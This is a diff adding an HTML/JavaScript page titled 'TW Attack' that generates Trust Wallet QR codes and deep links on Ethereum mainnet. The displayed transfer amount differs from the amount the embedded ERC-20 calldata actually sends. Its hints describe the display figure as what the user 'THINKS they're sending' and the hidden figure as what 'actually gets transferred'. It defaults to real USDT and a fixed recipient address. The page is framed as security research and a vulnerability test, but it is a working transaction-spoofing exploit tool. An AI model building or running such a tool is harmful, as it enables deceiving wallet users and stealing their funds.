@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW Attack — Amount+Data QR Generator (Mainnet)</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 800px; margin: 0 auto; }
+    h1 { font-size: 20px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
+    .insight-card { background: #161b22; border: 1px solid #f0883e44; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .insight-card h3 { font-size: 13px; color: #f0883e; margin-bottom: 6px; }
+    .insight-card p, .insight-card ul { font-size: 12px; color: #c9d1d9; line-height: 1.5; }
+    .insight-card ul { padding-left: 16px; margin-top: 4px; }
+    .insight-card code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; }
+    .insight-card .win { color: #3fb950; font-weight: 600; }
+    .insight-card .lose { color: #ff6b6b; font-weight: 600; }
+    .insight-card .unknown { color: #f0883e; font-weight: 600; }
+    .form-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    label { display: block; font-size: 12px; color: #8b949e; margin-bottom: 4px; margin-top: 12px; }
+    label:first-child { margin-top: 0; }
+    input, select { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #e6edf3; font-size: 14px; font-family: monospace; }
+    input:focus, select:focus { outline: none; border-color: #f0883e; }
+    .hint { font-size: 10px; color: #8b949e; margin-top: 3px; }
+    .btn-row { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+    .btn { flex: 1; padding: 10px 16px; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; min-width: 120px; }
+    .btn-primary { background: #f0883e; color: #0d1117; }
+    .btn-primary:hover { background: #f0a05e; }
+    .btn-eip { background: #1f6feb; color: #fff; }
+    .btn-eip:hover { background: #388bfd; }
+    .btn-trust { background: #8957e5; color: #fff; }
+    .btn-trust:hover { background: #a371f7; }
+    .btn-dl { background: #238636; color: #fff; }
+    .btn-dl:hover { background: #2ea043; }
+    .btn-secondary { background: #21262d; color: #e6edf3; border: 1px solid #30363d; }
+    .btn-secondary:hover { background: #30363d; }
+    .output-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; display: none; }
+    .output-card.visible { display: block; }
+    .variant-tabs { display: flex; gap: 4px; margin: 12px 0; flex-wrap: wrap; }
+    .variant-tab { padding: 6px 12px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer; border: 1px solid #30363d; background: #0d1117; color: #8b949e; }
+    .variant-tab.active { background: #1f6feb22; border-color: #1f6feb; color: #58a6ff; }
+    .variant-tab.trust-active { background: #8957e522; border-color: #8957e5; color: #a371f7; }
+    .variant-tab.dl-active { background: #23863622; border-color: #238636; color: #3fb950; }
+    .qr-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 12px 0; }
+    .qr-cell { text-align: center; background: #0d1117; padding: 12px; border-radius: 8px; border: 1px solid #21262d; }
+    .qr-cell h4 { font-size: 11px; color: #8b949e; margin-bottom: 6px; text-transform: uppercase; }
+    .qr-cell img { max-width: 220px; max-height: 220px; border-radius: 6px; background: white; padding: 6px; }
+    .qr-cell .label { font-size: 10px; margin-top: 4px; }
+    .qr-cell .uri-small { font-size: 8px; color: #8b949e; word-break: break-all; max-height: 40px; overflow-y: auto; margin-top: 4px; }
+    .result-info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 12px 0; }
+    .result-info div { background: #0d1117; padding: 8px 10px; border-radius: 6px; }
+    .result-info .label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+    .result-info .value { font-size: 15px; font-weight: 600; margin-top: 2px; }
+    .result-info .value.display { color: #f0883e; }
+    .result-info .value.execute { color: #ff6b6b; }
+    .status { font-size: 12px; color: #8b949e; margin-top: 8px; }
+    .status.ok { color: #3fb950; }
+    .status.err { color: #ff6b6b; }
+    .built-with { text-align: center; font-size: 10px; color: #484f58; margin-top: 24px; }
+    @media (max-width: 600px) {
+      .qr-grid { grid-template-columns: 1fr; }
+      .btn { min-width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <h1>🔬 Trust Wallet QR — Mainnet Test Generator</h1>
+  <p class="subtitle">Proven: no-amount data override works • Hypothesis: amount+data should also pass through (Tx::transfer)</p>
+
+  <div class="insight-card">
+    <h3>⚡ Source Code Analysis — tx_builder.rs</h3>
+    <p>
+      <code>Tx::transfer</code> → passes <code>data</code> through raw: <code>data: transfer.data.to_vec()</code> ← <span class="win">WINNER</span><br>
+      <code>Tx::erc20_transfer</code> → <strong>builds its own calldata</strong>, ignores data field ← <span class="lose">EIP-681 /transfer fails here</span><br><br>
+      <strong>From Sepolia tests (confirmed):</strong><br>
+      ✅ <code>trust://send?asset=USDT&address=X&data=...</code> — NO amount → <span class="win">WORKS (data passes through)</span><br>
+      ✅ <code>https://link.trustwallet.com/send?asset=USDT&address=X&data=...</code> — NO amount → <span class="win">WORKS</span><br><br>
+      <strong>Untested hypothesis:</strong><br>
+      🔶 <code>trust://send?asset=USDT&address=X&amount=1&data=...</code> — WITH amount → <span class="unknown">does trust:// handler still use Tx::transfer when amount is present?</span><br>
+      🔶 <code>https://link.trustwallet.com/send?asset=USDT&address=X&amount=1&data=...</code> — WITH amount → <span class="unknown">does DL handler still pass data through?</span><br><br>
+      <strong>Wallet-core source:</strong> <code>Tx::transfer</code> has both <code>amount</code> (for display) AND <code>data</code> (passed through). If the mobile app creates <code>Tx::transfer</code> for trust:// send URLs, then <code>amount</code> shouldn't interfere with <code>data</code>.
+    </p>
+  </div>
+
+  <div class="form-card">
+    <label>Token Contract Address</label>
+    <input type="text" id="token" value="0xdAC17F958D2ee523a2206206994597C13D831ec7" placeholder="0xtoken">
+    <div class="hint">USDT Mainnet (default) — or any ERC-20 with transfer()</div>
+
+    <label>Recipient (to receive funds)</label>
+    <input type="text" id="recipient" value="0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a" placeholder="0xrecipient">
+
+    <label>Display Amount (shown in confirmation screen)</label>
+    <input type="number" id="displayAmount" value="1" min="0" step="0.01">
+    <div class="hint">e.g. 1 = 1 USDT — what the user THINKS they're sending</div>
+
+    <label>Execute Amount (actual data encodes this)</label>
+    <input type="number" id="executeAmount" value="4" min="0" step="0.01">
+    <div class="hint">e.g. 4 = 4 USDT — what actually gets transferred</div>
+
+    <label>Token Decimals</label>
+    <select id="decimals">
+      <option value="6" selected>6 (USDT, USDC)</option>
+      <option value="18">18 (most ERC-20)</option>
+      <option value="8">8 (WBTC)</option>
+    </select>
+
+    <div class="btn-row">
+      <button class="btn btn-trust" id="genTrustBtn">📱 trust:// + amount</button>
+      <button class="btn btn-dl" id="genDLBtn">🔗 Deep Link + amount</button>
+      <button class="btn btn-eip" id="genEipNoFnBtn">📄 EIP-681 (no fn)</button>
+      <button class="btn btn-secondary" id="genAllBtn">⚡ Generate ALL 3</button>
+    </div>
+  </div>
+
+  <div class="output-card" id="outputCard">
+    <h2 style="font-size: 15px; margin-bottom: 4px;">📱 Scan to Test</h2>
+    <p class="subtitle" style="margin-bottom: 8px;">Open Trust Wallet → QR scanner → scan the QR below</p>
+
+    <div class="variant-tabs" id="variantTabs"></div>
+
+    <div class="qr-grid" id="qrGrid"></div>
+
+    <div class="result-info">
+      <div>
+        <div class="label">📱 Wallet Shows</div>
+        <div class="value display" id="displayValue">—</div>
+      </div>
+      <div>
+        <div class="label">⚡ Actually Executes</div>
+        <div class="value execute" id="executeValue">—</div>
+      </div>
+    </div>
+
+    <div class="status" id="statusMsg">Ready</div>
+  </div>
+
+  <p class="built-with">Source: wallet-core tx_builder.rs • Tx::transfer passes data through • Hypothesis: amount parameter is display-only for trust://</p>
+
+  <script>
+    (function() {
+      const TOKEN_NAMES = {
+        '0xdac17f958d2ee523a2206206994597c13d831ec7': 'USDT',
+        '0xf07a16d28055d1e40e9c934628d043c8a9b2cabf': 'USDT (Mock)',
+        '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48': 'USDC'
+      };
+
+      function padHex(val, bytes) {
+        return val.toString(16).toLowerCase().padStart(bytes * 2, '0');
+      }
+
+      function encodeTransferCall(recipientRaw, amountHuman, decimals) {
+        const recipient = recipientRaw.replace('0x', '').toLowerCase();
+        const tokenAmount = BigInt(Math.round(amountHuman * Math.pow(10, decimals)));
+        return '0xa9059cbb' + 
+               recipient.padStart(64, '0') + 
+               padHex(tokenAmount, 32);
+      }
+
+      function assetId(token) {
+        return 'c60_t0x' + token.replace('0x', '').toLowerCase();
+      }
+
+      function buildUri(format, token, recipient, displayAmt, executeAmt, decimals) {
+        const displayUnits = Math.round(displayAmt * Math.pow(10, decimals));
+        const calldata = encodeTransferCall(recipient, executeAmt, decimals);
+        const asset = assetId(token);
+
+        switch(format) {
+          case 'trust':
+            // trust://send?asset=c60_t0xTOKEN&address=RECIPIENT&amount=DISPLAY_UNITS&data=CALLDATA
+            return 'trust://send?asset=' + asset + '&address=' + recipient + 
+                   '&amount=' + displayUnits + '&data=' + calldata;
+
+          case 'dl':
+            // https://link.trustwallet.com/send?asset=c60_t0xTOKEN&address=RECIPIENT&amount=DISPLAY_UNITS&data=CALLDATA
+            return 'https://link.trustwallet.com/send?asset=' + asset + '&address=' + recipient + 
+                   '&amount=' + displayUnits + '&data=' + calldata;
+
+          case 'eip-nofn':
+            // ethereum:0xTOKEN?data=FULL_CALLDATA (no function name → contract_generic route)
+            return 'ethereum:' + token + '?data=' + calldata;
+
+          default:
+            return '';
+        }
+      }
+
+      function generateAllQRs() {
+        const token = document.getElementById('token').value.trim();
+        const recipient = document.getElementById('recipient').value.trim();
+        const displayAmt = parseFloat(document.getElementById('displayAmount').value) || 0;
+        const executeAmt = parseFloat(document.getElementById('executeAmount').value) || 0;
+        const decimals = parseInt(document.getElementById('decimals').value);
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(token)) {
+          setStatus('❌ Invalid token address', false);
+          return;
+        }
+        if (!/^0x[a-fA-F0-9]{40}$/.test(recipient)) {
+          setStatus('❌ Invalid recipient address', false);
+          return;
+        }
+        if (displayAmt <= 0 || executeAmt <= 0) {
+          setStatus('❌ Amounts must be positive', false);
+          return;
+        }
+
+        const tokenKey = token.toLowerCase();
+        const tokenName = TOKEN_NAMES[tokenKey] || 'Token';
+
+        document.getElementById('displayValue').textContent = displayAmt + ' ' + tokenName;
+        document.getElementById('executeValue').textContent = executeAmt + ' ' + tokenName;
+
+        const formats = [
+          { id: 'trust', label: 'trust:// + amount', cls: 'trust-active', desc: 'trust:// with amount+data' },
+          { id: 'dl', label: 'Deep Link + amount', cls: 'dl-active', desc: 'link.trustwallet.com with amount+data' },
+          { id: 'eip-nofn', label: 'EIP-681 (raw)', cls: '', desc: 'ethereum:0xTOKEN?data= (no /transfer)' }
+        ];
+
+        // Build tabs
+        const tabsContainer = document.getElementById('variantTabs');
+        tabsContainer.innerHTML = '';
+        formats.forEach((f, i) => {
+          const tab = document.createElement('span');
+          tab.className = 'variant-tab ' + f.cls + ' ' + (i === 0 ? 'active' : '');
+          tab.textContent = (i+1) + '. ' + f.label;
+          tab.dataset.format = f.id;
+          tab.onclick = function() {
+            document.querySelectorAll('.variant-tab').forEach(t => t.className = t.className.replace(' active', ''));
+            this.className += ' active';
+            document.querySelectorAll('.qr-cell').forEach(c => c.style.display = 'none');
+            document.getElementById('qr-' + this.dataset.format).style.display = 'block';
+          };
+          tabsContainer.appendChild(tab);
+        });
+
+        // Build QR grid
+        const grid = document.getElementById('qrGrid');
+        grid.innerHTML = '';
+
+        formats.forEach(f => {
+          const uri = buildUri(f.id, token, recipient, displayAmt, executeAmt, decimals);
+          const cell = document.createElement('div');
+          cell.className = 'qr-cell';
+          cell.id = 'qr-' + f.id;
+          // Only first one visible
+          if (f.id !== 'trust') cell.style.display = 'none';
+
+          cell.innerHTML = `
+            <h4>${f.desc}</h4>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(uri)}" 
+                 alt="QR" loading="lazy">
+            <div class="label">
+              <span style="color:${f.id === 'trust' ? '#a371f7' : f.id === 'dl' ? '#3fb950' : '#58a6ff'}">
+                ${f.label}
+              </span>
+            </div>
+            <div class="uri-small">${uri}</div>
+          `;
+          grid.appendChild(cell);
+        });
+
+        setStatus('✅ 3 variants generated — scan each and report what confirmation screen shows', true);
+        document.getElementById('outputCard').classList.add('visible');
+      }
+
+      function setStatus(msg, ok) {
+        const el = document.getElementById('statusMsg');
+        el.textContent = msg;
+        el.className = 'status ' + (ok ? 'ok' : 'err');
+      }
+
+      document.getElementById('genTrustBtn').addEventListener('click', generateAllQRs);
+      document.getElementById('genDLBtn').addEventListener('click', generateAllQRs);
+      document.getElementById('genEipNoFnBtn').addEventListener('click', generateAllQRs);
+      document.getElementById('genAllBtn').addEventListener('click', generateAllQRs);
+
+      document.querySelectorAll('input, select').forEach(el => {
+        el.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter') generateAllQRs();
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
